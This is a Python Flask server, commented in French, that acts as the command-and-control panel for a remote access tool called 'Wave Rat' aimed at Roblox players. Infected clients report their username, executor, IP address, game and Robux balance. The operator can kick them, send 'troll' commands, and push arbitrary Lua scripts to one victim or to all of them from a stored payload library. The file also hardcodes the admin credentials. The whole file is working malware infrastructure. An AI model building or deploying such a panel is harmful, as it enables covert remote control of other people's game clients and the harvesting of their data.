from flask import Flask, request, jsonify, render_template_string, redirect, url_for, make_response, session
from flask_socketio import SocketIO
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import time
import eventlet
from datetime import datetime
import json
import os
import secrets
import re
import html

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = secrets.token_hex(32)
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Strict"
app.config["SESSION_COOKIE_SECURE"] = True  # HTTPS only

# Rate Limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per hour"],
    storage_uri="memory://"
)

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet", logger=False, engineio_logger=False)

# ==================== CONFIG ====================
LOGIN = "entrepreneur1337"
PASSWORD = "A9f!Q3r#Zx7L"
SESSION_DURATION = 24 * 3600
HISTORY_FILE = "history_log.json"
PAYLOADS_FILE = "payloads.json"
STATS_FILE = "stats.json"

connected_players = {}
pending_kicks = {}
pending_commands = {}
history_log = []
payloads = {}
peak_players = 0
total_executions = 0

# ==================== SECURITY FUNCTIONS ====================
def sanitize_html(text):
    """Échappe tous les caractères HTML dangereux"""
    if not text:
        return ""
    return html.escape(str(text))

def validate_userid(userid):
    """Valide que l'ID utilisateur est bien un nombre"""
    if not userid:
        return False
    return re.match(r'^\d+$', str(userid)) is not None

def validate_lua_script(script):
    """Valide un script Lua pour bloquer les commandes dangereuses"""
    if not script or len(script) > 50000:  # Max 50KB
        return False
    
    # Blacklist de commandes dangereuses
    blacklist = [
        'loadstring', 'require', 'getfenv', 'setfenv', 
        'rawget', 'rawset', 'debug.', 'os.', 'io.',
        'package.', 'dofile', 'load'
    ]
    
    script_lower = script.lower()
    for dangerous in blacklist:
        if dangerous in script_lower:
            return False
    
    return True

def generate_csrf_token():
    """Génère un token CSRF unique"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def verify_csrf_token(token):
    """Vérifie le token CSRF"""
    return token and session.get('csrf_token') == token

def mask_ip(ip):
    """Masque partiellement l'IP pour la confidentialité"""
    if not ip or ip == '?':
        return '?'
    parts = ip.split('.')
    if len(parts) == 4:
        return f"{parts[0]}.{parts[1]}.xxx.xxx"
    return ip

# ==================== DATA FUNCTIONS ====================
def load_history():
    global history_log
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history_log = json.load(f)
        except:
            history_log = []

def load_payloads():
    global payloads
    if os.path.exists(PAYLOADS_FILE):
        try:
            with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
                payloads = json.load(f)
        except:
            payloads = {}

def load_stats():
    global peak_players, total_executions
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                peak_players = data.get("peak_players", 0)
                total_executions = data.get("total_executions", 0)
        except:
            pass

def save_stats():
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump({"peak_players": peak_players, "total_executions": total_executions}, f, ensure_ascii=False, indent=2)
    except:
        pass

def save_payloads():
    try:
        with open(PAYLOADS_FILE, 'w', encoding='utf-8') as f:
            json.dump(payloads, f, ensure_ascii=False, indent=2)
    except:
        pass

load_history()
load_payloads()
load_stats()

def is_authenticated():
    return session.get("authenticated") is True and session.get("expires", 0) > time.time()

def require_auth(f):
    def wrapper(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for("login_page"))
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

def add_history(event_type, username, details=""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    # Sanitize toutes les données avant de les stocker
    history_log.insert(0, {
        "time": timestamp, 
        "type": sanitize_html(event_type), 
        "username": sanitize_html(username), 
        "details": sanitize_html(details)
    })
    if len(history_log) > 100:
        history_log.pop()
    try:
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(history_log, f, ensure_ascii=False, indent=2)
    except:
        pass
    socketio.emit("history_update", {"history": history_log[:50]})

# ==================== LOGIN ====================
LOGIN_HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.socket.io; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; connect-src 'self' wss:; img-src 'self' data:;">
    <title>Wave Rat - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root{--bg:#000;--card:#121212;--border:#1a1a1a;--primary:#00ff41;--text:#fff;--text-muted:#808080;}
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;}
        .login-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:3rem 4rem;max-width:420px;width:90%;box-shadow:0 30px 80px rgba(0,255,65,.2);}
        h1{font-size:2.2rem;text-align:center;margin-bottom:2rem;color:var(--primary);font-family:'Space Mono',monospace;letter-spacing:2px;}
        input{width:100%;padding:16px;background:#0a0a0a;border:1px solid var(--border);border-radius:12px;color:white;margin-bottom:1rem;font-size:1rem;}
        button{width:100%;padding:16px;background:var(--primary);border:none;border-radius:12px;color:#000;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px;}
        button:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(0,255,65,.4);}
        .error{color:#ff0055;margin-top:15px;text-align:center;}
    </style>
</head>
<body>
<div class="login-card">
    <h1>WAVE RAT</h1>
    <form method="post">
        <input type="text" name="login" placeholder="Login" required autofocus autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
        <button type="submit">CONNEXION</button>
    </form>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
</div>
</body>
</html>"""

@app.route("/login", methods=["GET", "POST"])
@limiter.limit("10 per minute")
def login_page():
    if is_authenticated():
        return redirect(url_for("index"))
    
    csrf_token = generate_csrf_token()
    
    if request.method == "POST":
        # Vérification CSRF
        if not verify_csrf_token(request.form.get("csrf_token")):
            return render_template_string(LOGIN_HTML, error="Invalid CSRF token", csrf_token=csrf_token)
        
        if request.form.get("login") == LOGIN and request.form.get("password") == PASSWORD:
            session["authenticated"] = True
            session["expires"] = time.time() + SESSION_DURATION
            resp = make_response(redirect(url_for("index")))
            resp.set_cookie("session_token", secrets.token_hex(32), max_age=SESSION_DURATION, httponly=True, samesite="Strict", secure=True)
            add_history("system", "ADMIN", "Connexion réussie")
            return resp
        
        add_history("system", "UNKNOWN", "Tentative de connexion échouée")
        return render_template_string(LOGIN_HTML, error="Identifiants incorrects", csrf_token=csrf_token)
    
    return render_template_string(LOGIN_HTML, csrf_token=csrf_token)

@app.route("/logout")
def logout():
    resp = make_response(redirect(url_for("login_page")))
    resp.delete_cookie("session_token")
    session.clear()
    add_history("system", "ADMIN", "Déconnexion")
    return resp

# ==================== MAIN DASHBOARD (voir partie 2) ====================
@app.route("/")
@require_auth
def index():
    csrf_token = generate_csrf_token()
    # Le HTML sera dans la partie 2 (trop long)
    return "Dashboard loading..." # Temporaire

# ==================== API ENDPOINTS ====================
@app.route("/api", methods=["GET", "POST"])
@limiter.limit("100 per minute")
def api():
    global total_executions
    now = time.time()
    
    if request.method == "POST":
        try:
            data = request.get_json(silent=True) or {}
            uid = str(data.get("userid", ""))
            
            # Validation de l'UID
            if not validate_userid(uid):
                return jsonify({"error": "Invalid user ID"}), 400
            
            action = data.get("action")
            
            if action == "register" and uid:
                # Sanitize toutes les données entrantes
                connected_players[uid] = {
                    "username": sanitize_html(data.get("username", "Unknown")),
                    "executor": sanitize_html(data.get("executor", "Unknown")),
                    "ip": mask_ip(data.get("ip", "Unknown")),  # Masquage IP
                    "last": now,
                    "online": True,
                    "game": sanitize_html(data.get("game", "Unknown")),
                    "gameId": str(data.get("gameId", 0)),
                    "jobId": sanitize_html(data.get("jobId", "Unknown")),
                    "robux": sanitize_html(str(data.get("robux", "?")))
                }
                add_history("connect", connected_players[uid]["username"], f"Game: {connected_players[uid]['game']}")
                
            elif action == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
                total_executions += 1
                
            elif action == "updaterobux" and uid in connected_players:
                new_robux = sanitize_html(str(data.get("robux", "?")))
                connected_players[uid]["robux"] = new_robux
                add_history("action", connected_players[uid]["username"], f"Robux: {new_robux}")
                
        except Exception as e:
            print(f"Erreur POST /api : {e}")
            return jsonify({"error": "Internal error"}), 500
        
        return jsonify({"ok": True})
    
    # GET request
    uid = request.args.get("userid", "")
    if not validate_userid(uid):
        return jsonify({})
    
    if uid in pending_kicks:
        reason = pending_kicks.pop(uid, "Kicked")
        return jsonify({"command": "kick", "reason": sanitize_html(reason)})
    
    if uid in pending_commands:
        cmd = pending_commands.pop(uid)
        res = {"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd}
        if isinstance(cmd, dict):
            for key in ["assetId", "text", "script"]:
                if key in cmd:
                    res[key] = sanitize_html(cmd[key]) if key != "script" else cmd[key]
        return jsonify(res)
    
    return jsonify({})

@app.route("/kick", methods=["POST"])
@require_auth
@limiter.limit("20 per minute")
def kick():
    # Vérification CSRF
    csrf_token = request.headers.get('X-CSRF-Token')
    if not verify_csrf_token(csrf_token):
        return jsonify({"error": "Invalid CSRF token"}), 403
    
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    
    if not validate_userid(uid):
        return jsonify({"error": "Invalid user ID"}), 400
    
    reason = sanitize_html(data.get("reason", "No reason"))
    
    if uid in connected_players:
        pending_kicks[uid] = reason
        name = connected_players[uid].get("username", "Unknown")
        add_history("action", name, f"KICKED: {reason}")
        return jsonify({"sent": True})
    
    return jsonify({"error": "Player not found"}), 404

@app.route("/troll", methods=["POST"])
@require_auth
@limiter.limit("30 per minute")
def troll():
    # Vérification CSRF
    csrf_token = request.headers.get('X-CSRF-Token')
    if not verify_csrf_token(csrf_token):
        return jsonify({"error": "Invalid CSRF token"}), 403
    
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    
    if not validate_userid(uid):
        return jsonify({"error": "Invalid user ID"}), 400
    
    # Whitelist des commandes autorisées
    allowed_cmds = ['freeze', 'unfreeze', 'spin', 'unspin', 'jump', 'rainbow', 'unrainbow', 
                    'explode', 'invisible', 'uninvisible', 'playsound', 'stopsound', 
                    'textscreen', 'hidetext', 'luaexec', 'refreshrobux']
    
    if cmd not in allowed_cmds:
        return jsonify({"error": "Invalid command"}), 400
    
    if uid and uid in connected_players:
        payload = {"cmd": cmd}
        details = cmd.upper()
        
        if "assetId" in data:
            payload["assetId"] = sanitize_html(str(data["assetId"]))
            details += f" ({payload['assetId']})"
        
        if "text" in data:
            payload["text"] = sanitize_html(data["text"])
            details += f" ({payload['text'][:30]}...)"
        
        if "script" in data:
            script = data["script"]
            if not validate_lua_script(script):
                return jsonify({"error": "Script contains forbidden commands or is too long"}), 400
            payload["script"] = script
            details += " (Lua)"
        
        pending_commands[uid] = payload
        name = connected_players[uid].get("username", "Unknown")
        add_history("action", name, details)
        return jsonify({"sent": True})
    
    return jsonify({"error": "Invalid request"}), 400

@app.route("/exec_all", methods=["POST"])
@require_auth
@limiter.limit("5 per minute")  # Très limité car dangereux
def exec_all():
    # Vérification CSRF
    csrf_token = request.headers.get('X-CSRF-Token')
    if not verify_csrf_token(csrf_token):
        return jsonify({"error": "Invalid CSRF token"}), 403
    
    data = request.get_json() or {}
    script = data.get("script", "").strip()
    
    if not script:
        return jsonify({"error": "Empty script"}), 400
    
    if not validate_lua_script(script):
        return jsonify({"error": "Script contains forbidden commands or is too long"}), 400
    
    now = time.time()
    count = 0
    
    for uid, player in connected_players.items():
        if now - player.get("last", 0) < 30:
            pending_commands[uid] = {"cmd": "luaexec", "script": script}
            count += 1
    
    if count > 0:
        add_history("action", "ADMIN", f"EXEC ALL → {count} clients")
    
    return jsonify({"sent": True, "count": count})

@app.route("/payload", methods=["GET", "POST"])
@require_auth
@limiter.limit("30 per minute")
def payload():
    if request.method == "GET":
        action = request.args.get("action")
        if action == "list":
            return jsonify(payloads)
        if action == "get":
            name = sanitize_html(request.args.get("name", ""))
            return jsonify({"code": payloads.get(name, "")})
        return jsonify({"error": "Invalid action"}), 400
    
    # POST
    csrf_token = request.headers.get('X-CSRF-Token')
    if not verify_csrf_token(csrf_token):
        return jsonify({"error": "Invalid CSRF token"}), 403
    
    data = request.get_json() or {}
    action = data.get("action")
    name = sanitize_html(data.get("name", ""))
    
    if action == "create":
        code = data.get("code", "")
        if not validate_lua_script(code):
            return jsonify({"error": "Invalid Lua code"}), 400
        payloads[name] = code
        
    elif action == "update":
        old = sanitize_html(data.get("oldname", ""))
        if old and old in payloads:
            del payloads[old]
        code = data.get("code", "")
        if not validate_lua_script(code):
            return jsonify({"error": "Invalid Lua code"}), 400
        payloads[name] = code
        
    elif action == "delete":
        payloads.pop(name, None)
    else:
        return jsonify({"error": "Invalid action"}), 400
    
    save_payloads()
    return jsonify({"ok": True})

def broadcast_loop():
    global peak_players
    while True:
        now = time.time()
        online = 0
        to_remove = []
        
        for uid, p in list(connected_players.items()):
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                was_online = p.get("online", False)
                p["online"] = now - p["last"] < 15
                if was_online and not p["online"]:
                    add_history("disconnect", p["username"], "Timeout")
                if p["online"]:
                    online += 1
        
        for uid in to_remove:
            p = connected_players.pop(uid, {})
            add_history("disconnect", p.get("username", "Unknown"), "Disconnected")
        
        if online > peak_players:
            peak_players = online
            save_stats()
        
        # Sanitize toutes les données avant broadcast
        safe_players = {}
        for k, v in connected_players.items():
            safe_players[k] = {
                "username": v.get("username", "Unknown"),
                "executor": v.get("executor", "Unknown"),
                "ip": v.get("ip", "?"),
                "online": v.get("online", False),
                "game": v.get("game", "Unknown"),
                "gameId": v.get("gameId", "0"),
                "jobId": v.get("jobId", "Unknown"),
                "robux": v.get("robux", "?")
            }
        
        socketio.emit("update", {
            "players": safe_players, 
            "online": online, 
            "peak": peak_players, 
            "total_exec": total_executions
        })
        
        socketio.sleep(3)

if __name__ == "__main__":
    print("🔒 Wave Rat SECURE démarré → http://0.0.0.0:5000")
    print("⚠️  Utiliser avec HTTPS en production!")
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000, allow_unsafe_werkzeug=True)
